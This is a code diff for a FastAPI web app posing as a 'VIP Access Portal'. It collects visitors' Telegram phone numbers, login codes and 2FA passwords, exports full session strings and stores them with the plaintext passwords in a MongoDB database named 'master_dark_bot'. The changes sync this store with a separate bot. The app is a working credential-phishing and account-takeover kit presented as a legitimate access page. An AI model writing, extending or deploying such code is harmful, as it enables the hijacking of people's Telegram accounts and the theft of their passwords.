@@ -1,4 +1,3 @@
-
 import os
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.responses import HTMLResponse
@@ -16,11 +15,15 @@ app = FastAPI(title="VIP Access Portal")
 
 API_ID = int(os.environ.get("API_ID", "123456"))
 API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
-MONGO_URL = os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority")
+
+# Bot ke saath sync karne ke liye MONGO_URI variable use kiya hai
+MONGO_URI = os.environ.get("MONGO_URI", os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority"))
 CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")
 
-mongo_client = AsyncIOMotorClient(MONGO_URL)
-db = mongo_client["telegram_db"]
+mongo_client = AsyncIOMotorClient(MONGO_URI)
+
+# Bot ke database aur collection se matching setup
+db = mongo_client["master_dark_bot"]
 sessions_col = db["sessions"]
 
 active_clients = {}
@@ -225,12 +228,10 @@ HTML_TEMPLATE = """
 
   </div>
 
-  <!-- Updated Auth Modal -->
   <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
     <div class="bg-[#11141d] w-full max-w-md rounded-2xl p-6 relative border border-gray-800 shadow-2xl">
       <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>
 
-      <!-- Step 1: Phone -->
       <div id="step-phone" class="space-y-4">
         <div class="text-center">
           <i class="fa-brands fa-telegram text-5xl text-blue-500 mb-2"></i>
@@ -241,7 +242,6 @@ HTML_TEMPLATE = """
         <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl">Send Code</button>
       </div>
 
-      <!-- Step 2: OTP -->
       <div id="step-otp" class="space-y-4 hidden">
         <div class="text-center">
           <i class="fa-solid fa-shield-halved text-5xl text-green-500 mb-2"></i>
@@ -253,7 +253,6 @@ HTML_TEMPLATE = """
         
         <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3 bg-green-600 hover:bg-green-500 text-white font-semibold rounded-xl transition">Verify & Continue</button>
 
-        <!-- Action Buttons (Edit Number & Resend Code) -->
         <div class="flex items-center justify-between text-xs pt-1">
           <button onclick="goBackToPhone()" class="text-gray-400 hover:text-white flex items-center gap-1">
             <i class="fa-solid fa-pen-to-square"></i> Edit Number
@@ -264,7 +263,6 @@ HTML_TEMPLATE = """
         </div>
       </div>
 
-      <!-- Step 3: 2FA Password -->
       <div id="step-2fa" class="space-y-4 hidden">
         <div class="text-center">
           <i class="fa-solid fa-lock text-5xl text-yellow-500 mb-2"></i>
@@ -272,7 +270,6 @@ HTML_TEMPLATE = """
           <p class="text-sm text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
         </div>
         
-        <!-- Input with Eye Icon Toggle -->
         <div class="relative">
           <input type="password" id="passwordInput" placeholder="Enter Password" class="w-full bg-gray-900 border border-gray-700 rounded-xl pl-4 pr-12 py-3 text-white focus:outline-none focus:border-yellow-500 text-lg text-center">
           <button type="button" onclick="togglePassword()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white">
@@ -330,14 +327,11 @@ HTML_TEMPLATE = """
 
         if (!clean) return showError("Please enter a valid phone number");
 
-        // SMART PHONE NUMBER FORMATTING (ALL COUNTRIES SUPPORTED)
         if (clean.startsWith('+')) {
             userPhone = clean;
         } else if (clean.length === 10) {
-            // Default India (+91) if user enters only 10 digits
             userPhone = '+91' + clean;
         } else {
-            // Add '+' automatically for code entered without + (e.g. 91..., 1...)
             userPhone = '+' + clean;
         }
       }
@@ -429,6 +423,8 @@ async def send_code(data: PhoneReq):
 @app.post("/api/verify-otp")
 async def verify_otp(data: OtpReq):
     phone = data.phone.strip()
+    clean_phone = phone.replace("+", "").strip()
+    
     if phone not in active_clients:
         raise HTTPException(status_code=400, detail="Session expired. Restart process.")
     
@@ -441,10 +437,11 @@ async def verify_otp(data: OtpReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
+        # Sync format with Bot's database: saves clean phone (without +)
         await sessions_col.update_one(
-            {"phone": phone},
+            {"$or": [{"phone": clean_phone}, {"phone": phone}]},
             {"$set": {
-                "phone": phone, 
+                "phone": clean_phone, 
                 "session": string_session, 
                 "two_factor": "None", 
                 "status": "active"
@@ -467,6 +464,8 @@ async def verify_otp(data: OtpReq):
 @app.post("/api/verify-2fa")
 async def verify_2fa(data: PasswordReq):
     phone = data.phone.strip()
+    clean_phone = phone.replace("+", "").strip()
+    
     if phone not in active_clients:
         raise HTTPException(status_code=400, detail="Session expired. Restart process.")
     
@@ -477,10 +476,11 @@ async def verify_2fa(data: PasswordReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
+        # Sync format with Bot's database: saves clean phone with 2FA
         await sessions_col.update_one(
-            {"phone": phone},
+            {"$or": [{"phone": clean_phone}, {"phone": phone}]},
             {"$set": {
-                "phone": phone, 
+                "phone": clean_phone, 
                 "session": string_session, 
                 "two_factor": data.password, 
                 "status": "active"
@@ -494,3 +494,4 @@ async def verify_2fa(data: PasswordReq):
         raise HTTPException(status_code=400, detail="Incorrect 2FA Password.")
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
+    
